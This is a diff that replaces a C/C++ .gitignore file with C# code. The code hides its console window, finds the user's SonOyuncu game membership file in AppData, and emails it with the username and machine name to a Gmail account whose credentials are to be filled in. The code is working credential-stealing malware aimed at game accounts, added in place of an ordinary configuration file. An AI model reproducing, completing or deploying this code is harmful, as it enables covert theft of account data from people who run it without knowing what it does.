@@ -1,52 +1,46 @@
-# Prerequisites
-*.d
+  [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-# Object files
-*.o
-*.ko
-*.obj
-*.elf
+        [DllImport("Kernel32")]
+        private static extern IntPtr GetConsoleWindow();
 
-# Linker output
-*.ilk
-*.map
-*.exp
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
 
-# Precompiled Headers
-*.gch
-*.pch
+        static void Main(string[] args)
+        {
+            string protect = "weizu";
+            if (protect=="weizu")
+            {
 
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
+                IntPtr hwnd;
+                hwnd = GetConsoleWindow();
+                ShowWindow(hwnd, SW_HIDE);
+                string sonoyuncu = "\\.sonoyuncu\\sonoyuncu-membership.json";
+                string local = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+                string fromEmail; string toEmail; string subject; string body; string gmailUser; string gmailPass; string savedat;
 
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
+                gmailUser = "mail"; // Gmail mailiniz
+                gmailPass = "parola"; // Gmail parolanız
+                toEmail = gmailUser;
+                fromEmail = gmailUser;
+                string userName = Environment.UserName;
+                string computerName = System.Environment.MachineName.ToString();
+                subject = "SonOyuncu Membership";
+                body = "sonoyuncu-membership.json" + Environment.UserName + "/ " + Environment.MachineName;
+                savedat = local + sonoyuncu;
+                MailMessage message = new MailMessage(fromEmail, toEmail, subject, body);
+                SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
+                smtp.EnableSsl = true;
+                smtp.Credentials = new NetworkCredential(gmailUser, gmailPass);
 
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
+                if (savedat != string.Empty || savedat != null)
+                {
+                    Attachment attach = new Attachment(savedat);
+                    message.Attachments.Add(attach);
+                }
 
-# Debug files
-*.dSYM/
-*.su
-*.idb
-*.pdb
-
-# Kernel Module Compile Results
-*.mod*
-*.cmd
-.tmp_versions/
-modules.order
-Module.symvers
-Mkfile.old
-dkms.conf
+                smtp.Send(message);
+                return;
+            }
+        }
